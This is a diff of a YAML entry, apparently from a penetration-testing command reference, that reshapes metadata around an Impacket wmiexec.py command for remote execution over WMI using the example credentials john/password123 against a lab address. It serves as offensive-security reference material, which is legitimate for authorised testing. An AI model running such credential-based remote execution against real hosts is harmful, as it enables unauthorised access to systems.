@@ -11,21 +11,16 @@ description: |
   	Username: john
 
   	Password: password123
+command: |
+  python3 wmiexec.py test.local/john:password123@10.10.10.1
 items:
-  Password:
-    - code: |
-        python3 wmiexec.py test.local/john:password123@10.10.10.1
-  Username:
-    - code: |
-        empty
-filters:
-  WMI:
-    - code: |
-        empty
-  Linux:
-    - code: |
-        empty
-  Windows:
-    - code: |
-        empty
+  - Password
+  - Username
+services:
+  - WMI
+OS:
+  - Linux
+  - Windows
+attack_types:
+  - Exploitation
 ---
